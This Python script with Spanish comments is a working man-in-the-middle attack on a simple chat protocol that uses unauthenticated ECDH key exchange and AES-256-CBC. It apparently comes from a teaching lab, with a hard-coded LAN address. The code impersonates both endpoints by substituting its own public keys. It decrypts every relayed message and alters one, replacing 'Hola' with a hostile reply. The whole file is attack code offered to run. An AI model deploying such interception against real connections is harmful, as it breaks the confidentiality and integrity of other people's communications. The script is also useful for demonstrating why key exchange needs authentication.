import socket
from Crypto.PublicKey import ECC
from Crypto.Hash import SHA256
from Crypto.Protocol.KDF import HKDF
from Crypto.Cipher import AES
from Crypto.Math.Numbers import Integer
from Crypto.Random import get_random_bytes

HEADER = 64
PORT_CLIENT = 5050  # Puerto en el que el cliente cree que está el servidor
PORT_SERVER = 5051  # Puerto del servidor real
SERVER_IP = "192.168.20.29"  # IP del servidor y del atacante
FORMAT = 'utf-8'
BLOCK_SIZE = 16  # Tamaño del bloque para AES

# Generar claves ECC para el atacante
def generate_ecc_keys():
    private_key = ECC.generate(curve='P-256')
    public_key = private_key.public_key()
    return private_key, public_key

# Derivar clave AES usando HKDF
def derive_symmetric_key(shared_secret):
    derived_key = HKDF(shared_secret, 32, b'', SHA256)  # Derivar clave AES-256
    return derived_key

# Función para realizar manualmente el intercambio ECDH (usando la clave privada y el punto público del cliente/servidor)
def ecdh_shared_secret(private_key, public_key):
    public_point = public_key.pointQ
    shared_point = public_point * Integer(private_key.d)
    return int(shared_point.x)

# Cifrar mensaje con AES-256-CBC
def encrypt_message(key, message):
    iv = get_random_bytes(BLOCK_SIZE)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    padded_message = message + b' ' * (BLOCK_SIZE - len(message) % BLOCK_SIZE)
    ciphertext = iv + cipher.encrypt(padded_message)
    return ciphertext

# Descifrar mensaje con AES-256-CBC
def decrypt_message(key, encrypted_message):
    iv = encrypted_message[:BLOCK_SIZE]
    cipher = AES.new(key, AES.MODE_CBC, iv)
    plaintext = cipher.decrypt(encrypted_message[BLOCK_SIZE:]).rstrip(b' ')
    return plaintext

# Función para manejar el ataque MitM
def mitm_attack():
    print("[Atacante] Esperando conexión del cliente...")
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.bind(('192.168.20.29', PORT_CLIENT))  # El atacante escucha en el puerto 5050
    client_socket.listen(1)
    
    client_conn, client_addr = client_socket.accept()  # Conectar con el cliente
    print(f"[Atacante] Cliente conectado: {client_addr}")

    # Conectar al servidor real
    print("[Atacante] Conectándose al servidor real...")
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.connect((SERVER_IP, PORT_SERVER))  # Conectar al servidor real

    # Intercambio de claves con el cliente
    print("[Atacante] Intercambiando claves con el cliente...")
    client_private_key, client_public_key = generate_ecc_keys()

    # Recibir la clave pública del cliente
    client_public_key_length = int(client_conn.recv(HEADER).decode(FORMAT))
    client_public_key_bytes = client_conn.recv(client_public_key_length)
    client_public_key_client = ECC.import_key(client_public_key_bytes)

    # Enviar clave pública falsa del atacante al cliente
    client_conn.send(str(len(client_public_key.export_key(format='DER'))).encode(FORMAT).ljust(HEADER))
    client_conn.send(client_public_key.export_key(format='DER'))

    # Intercambio de claves con el servidor
    print("[Atacante] Intercambiando claves con el servidor...")
    server_private_key, server_public_key = generate_ecc_keys()

    # Recibir la clave pública del servidor
    server_public_key_length = int(server_socket.recv(HEADER).decode(FORMAT))
    server_public_key_bytes = server_socket.recv(server_public_key_length)
    server_public_key_server = ECC.import_key(server_public_key_bytes)

    # Enviar clave pública falsa del atacante al servidor
    server_socket.send(str(len(server_public_key.export_key(format='DER'))).encode(FORMAT).ljust(HEADER))
    server_socket.send(server_public_key.export_key(format='DER'))

    # Generar secretos compartidos (ECDH manual)
    shared_secret_client = ecdh_shared_secret(client_private_key, client_public_key_client)
    shared_secret_server = ecdh_shared_secret(server_private_key, server_public_key_server)

    # Derivar claves AES para cliente y servidor
    derived_key_client = derive_symmetric_key(str(shared_secret_client).encode())
    derived_key_server = derive_symmetric_key(str(shared_secret_server).encode())

    print("[Atacante] Secretos compartidos y claves derivadas generadas con éxito.")

    # Comenzar la interceptación de mensajes
    while True:
        try:
            # Recibir mensaje del cliente
            msg_length = client_conn.recv(HEADER).decode(FORMAT)
            if msg_length:
                msg_length = int(msg_length)
                encrypted_msg_client = client_conn.recv(msg_length)

                # Descifrar mensaje del cliente
                decrypted_msg = decrypt_message(derived_key_client, encrypted_msg_client).decode(FORMAT)
                print(f"[Atacante] Mensaje del cliente: {decrypted_msg}")

                # Modificar el mensaje si es "Hola"
                if decrypted_msg == "Hola":
                    decrypted_msg = "No quiero hablar contigo"

                # Cifrar el mensaje modificado o el original con la clave del servidor
                encrypted_msg_server = encrypt_message(derived_key_server, decrypted_msg.encode(FORMAT))

                # Enviar el mensaje cifrado al servidor
                send_length = str(len(encrypted_msg_server)).encode(FORMAT)
                send_length += b' ' * (HEADER - len(send_length))
                server_socket.send(send_length)
                server_socket.send(encrypted_msg_server)

            # Recibir respuesta del servidor
            msg_length = server_socket.recv(HEADER).decode(FORMAT)
            if msg_length:
                msg_length = int(msg_length)
                encrypted_msg_server = server_socket.recv(msg_length)

                # Descifrar mensaje del servidor
                decrypted_msg = decrypt_message(derived_key_server, encrypted_msg_server).decode(FORMAT)
                print(f"[Atacante] Mensaje del servidor: {decrypted_msg}")

                # Cifrar el mensaje original con la clave del cliente
                encrypted_msg_client = encrypt_message(derived_key_client, decrypted_msg.encode(FORMAT))

                # Enviar el mensaje cifrado al cliente
                send_length = str(len(encrypted_msg_client)).encode(FORMAT)
                send_length += b' ' * (HEADER - len(send_length))
                client_conn.send(send_length)
                client_conn.send(encrypted_msg_client)

        except Exception as e:
            print(f"[Atacante] Error: {str(e)}")
            client_conn.close()
            server_socket.close()
            break

if __name__ == "__main__":
    print("[Atacante] Iniciando ataque de Hombre en el Medio...")
    mitm_attack()
